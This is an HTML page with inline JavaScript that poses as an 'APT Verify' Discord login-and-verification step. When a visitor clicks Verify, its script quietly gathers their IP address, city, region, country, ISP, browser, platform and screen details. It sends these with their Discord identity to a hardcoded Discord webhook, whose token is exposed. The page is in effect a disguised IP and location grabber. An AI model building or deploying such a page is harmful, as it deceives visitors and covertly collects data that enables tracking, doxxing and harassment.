<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>APT Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            background: #0a0a0a;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 460px;
            width: 100%;
        }
        .card {
            background: #111111;
            border-radius: 20px;
            padding: 40px 32px;
            border: 1px solid rgba(160, 80, 255, 0.15);
            box-shadow: 0 0 60px rgba(160, 80, 255, 0.05);
            text-align: center;
        }
        .logo {
            font-size: 48px;
            font-weight: 900;
            color: #a855f7;
            letter-spacing: -1px;
            margin-bottom: 4px;
            text-shadow: 0 0 40px rgba(168, 85, 247, 0.15);
        }
        .logo span { color: #fff; }
        .btn-discord {
            width: 100%;
            padding: 16px;
            background: #5865F2;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            font-family: inherit;
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-top: 8px;
            text-decoration: none;
            display: inline-block;
        }
        .btn-discord:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(88, 101, 242, 0.3);
        }
        .btn-discord:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #7c3aed, #a855f7);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            font-family: inherit;
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-top: 8px;
        }
        .btn-verify:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.2);
        }
        .btn-verify:active { transform: scale(0.97); }
        .btn-verify:disabled { opacity: 0.5; cursor: not-allowed; }
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
        }
        .status.success {
            display: block;
            background: rgba(34, 197, 94, 0.08);
            border: 1px solid rgba(34, 197, 94, 0.15);
            color: #4ade80;
        }
        .status.error {
            display: block;
            background: rgba(239, 68, 68, 0.08);
            border: 1px solid rgba(239, 68, 68, 0.15);
            color: #f87171;
        }
        .status.loading {
            display: block;
            background: rgba(168, 85, 247, 0.08);
            border: 1px solid rgba(168, 85, 247, 0.15);
            color: #a855f7;
        }
        .user-info {
            margin-top: 20px;
            padding: 16px;
            background: #1a1a1a;
            border-radius: 12px;
            border: 1px solid rgba(168, 85, 247, 0.06);
            display: none;
        }
        .user-info.show { display: block; }
        .user-info .avatar {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 2px solid #a855f7;
            margin-bottom: 8px;
        }
        .user-info .name {
            color: #e5e7eb;
            font-size: 18px;
            font-weight: 600;
        }
        .user-info .tag {
            color: #6b7280;
            font-size: 14px;
        }
        .timer {
            color: #a855f7;
            font-size: 24px;
            font-weight: 700;
            margin-top: 12px;
            display: none;
        }
        .footer {
            margin-top: 20px;
            color: #374151;
            font-size: 11px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .footer span { color: #a855f7; }
        @media (max-width: 500px) {
            .card { padding: 28px 20px; }
            .logo { font-size: 36px; }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <div class="logo">APT <span>VERIFY</span></div>

            <a href="#" class="btn-discord" id="loginBtn">⚡ Login with Discord</a>

            <div class="user-info" id="userInfo">
                <img class="avatar" id="userAvatar" src="" alt="Avatar" />
                <div class="name" id="userName">—</div>
                <div class="tag" id="userTag">#0000</div>
                <button class="btn-verify" id="verifyBtn">⚡ VERIFY</button>
            </div>

            <div class="timer" id="timer">5</div>
            <div class="status" id="status"></div>

            <div class="footer"><span>◆</span> APT SECURE <span>◆</span></div>
        </div>
    </div>

    <script>
        // 🔧 WEBHOOK URL (for logging)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1539186452745814087/NSGvGlOul-WC2gxX1e-WMJEDxzfTkOW7vsrnkPaVIvhBFf79rw-iSunfZwiNqbcbhqaW';
        
        const CLIENT_ID = '1539183585813332050';
        const REDIRECT_URI = 'https://usupusu.github.io/Aptverification/';

        const loginBtn = document.getElementById('loginBtn');
        const userInfo = document.getElementById('userInfo');
        const userAvatar = document.getElementById('userAvatar');
        const userName = document.getElementById('userName');
        const userTag = document.getElementById('userTag');
        const verifyBtn = document.getElementById('verifyBtn');
        const status = document.getElementById('status');
        const timerDisplay = document.getElementById('timer');

        let discordUser = null;
        let accessToken = null; // Store the token for DM sending

        function getOAuthURL() {
            const base = 'https://discord.com/api/oauth2/authorize';
            const params = new URLSearchParams({
                client_id: CLIENT_ID,
                redirect_uri: REDIRECT_URI,
                response_type: 'token',
                scope: 'identify' // ✅ DM works with 'identify' scope
            });
            return `${base}?${params.toString()}`;
        }

        function handleCallback() {
            const hash = window.location.hash;
            if (!hash) return;

            const params = new URLSearchParams(hash.substring(1));
            const token = params.get('access_token');
            if (!token) return;

            // Store token for DM sending
            accessToken = token;

            status.className = 'status loading';
            status.textContent = '⏳ Logging in...';
            loginBtn.disabled = true;

            fetch('https://discord.com/api/users/@me', {
                headers: { 'Authorization': `Bearer ${token}` }
            })
            .then(res => {
                if (!res.ok) throw new Error('Failed to fetch user');
                return res.json();
            })
            .then(user => {
                discordUser = user;
                userAvatar.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
                userName.textContent = user.username;
                userTag.textContent = `#${user.discriminator}`;
                userInfo.classList.add('show');
                loginBtn.style.display = 'none';
                window.history.replaceState({}, document.title, window.location.pathname);
                status.className = 'status success';
                status.textContent = `✅ Logged in as ${user.username}`;
                setTimeout(() => {
                    status.className = 'status';
                    status.textContent = '';
                }, 3000);
            })
            .catch(err => {
                status.className = 'status error';
                status.textContent = '❌ Login failed';
                loginBtn.disabled = false;
            });
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';

            return {
                browser: browser,
                platform: navigator.platform,
                resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toLocaleString()
            };
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return null;
            }
        }

        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            } catch {
                return null;
            }
        }

        // --- SEND DM TO USER ---
        async function sendDM(token, userId, message) {
            try {
                // 1. Create DM channel
                const dmResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ recipient_id: userId })
                });

                if (!dmResponse.ok) {
                    throw new Error('Failed to create DM channel');
                }

                const dmData = await dmResponse.json();
                const channelId = dmData.id;

                // 2. Send message to DM channel
                const msgResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: message })
                });

                if (!msgResponse.ok) {
                    throw new Error('Failed to send DM');
                }

                return true;
            } catch (error) {
                console.error('DM error:', error);
                return false;
            }
        }

        // --- Send to Webhook (for logging) ---
        async function sendToWebhook(data) {
            try {
                const payload = {
                    embeds: [{
                        title: "📥 APT Verification",
                        color: 0xA855F7,
                        fields: [
                            { name: "Discord Username", value: data.discordUser, inline: true },
                            { name: "Discord ID", value: data.discordId, inline: true },
                            { name: "IP Address", value: data.ip, inline: true },
                            { name: "Country", value: data.country, inline: true },
                            { name: "City", value: data.city, inline: true },
                            { name: "Region", value: data.region, inline: true },
                            { name: "ISP", value: data.isp, inline: true },
                            { name: "Time Zone", value: data.timezone, inline: true },
                            { name: "Browser", value: data.browser, inline: true },
                            { name: "Platform", value: data.platform, inline: true },
                            { name: "Screen Resolution", value: data.resolution, inline: true },
                            { name: "Local Time", value: data.localTime, inline: true }
                        ],
                        footer: { text: "🛡️ Verified via Discord OAuth2" }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                return true;
            } catch {
                return false;
            }
        }

        verifyBtn.addEventListener('click', async function() {
            if (!discordUser) {
                status.className = 'status error';
                status.textContent = '❌ Please login with Discord first.';
                return;
            }

            verifyBtn.disabled = true;
            timerDisplay.style.display = 'block';
            let countdown = 5;
            timerDisplay.textContent = countdown;

            const timerInterval = setInterval(() => {
                countdown--;
                timerDisplay.textContent = countdown;
                if (countdown <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.style.display = 'none';
                    processVerification();
                }
            }, 1000);
        });

        async function processVerification() {
            status.className = 'status loading';
            status.textContent = '⏳ Processing...';

            try {
                const ip = await getIP();
                if (!ip) {
                    status.className = 'status error';
                    status.textContent = '❌ Failed to fetch IP.';
                    verifyBtn.disabled = false;
                    return;
                }

                const details = await getIPDetails(ip);
                const browserInfo = getBrowserInfo();

                const logData = {
                    discordUser: `${discordUser.username}#${discordUser.discriminator}`,
                    discordId: discordUser.id,
                    ip: details ? details.ip : ip,
                    country: details ? details.country : 'Unknown',
                    city: details ? details.city : 'Unknown',
                    region: details ? details.region : 'Unknown',
                    isp: details ? details.isp : 'Unknown',
                    timezone: details ? details.timezone : browserInfo.timezone,
                    browser: browserInfo.browser,
                    platform: browserInfo.platform,
                    resolution: browserInfo.resolution,
                    localTime: browserInfo.localTime
                };

                // 1. Send to webhook (logging)
                await sendToWebhook(logData);

                // 2. Send DM to user
                const dmMessage = `✅ **APT Verification Complete!**\n\nYou have been successfully verified.\n\n🛡️ **Your Info:**\n• IP: ${logData.ip}\n• Country: ${logData.country}\n• City: ${logData.city}\n• Browser: ${logData.browser}\n• Platform: ${logData.platform}\n• Time: ${logData.localTime}`;

                const dmSent = await sendDM(accessToken, discordUser.id, dmMessage);

                if (dmSent) {
                    status.className = 'status success';
                    status.textContent = `✅ Verified! DM sent to ${discordUser.username}`;
                } else {
                    status.className = 'status success';
                    status.textContent = `✅ Verified! (DM failed, but logged)`;
                }

                setTimeout(() => {
                    status.className = 'status';
                    status.textContent = '';
                }, 5000);

            } catch {
                status.className = 'status error';
                status.textContent = '❌ Error occurred.';
            }

            verifyBtn.disabled = false;
        }

        loginBtn.href = getOAuthURL();
        handleCallback();
    </script>

</body>
</html>
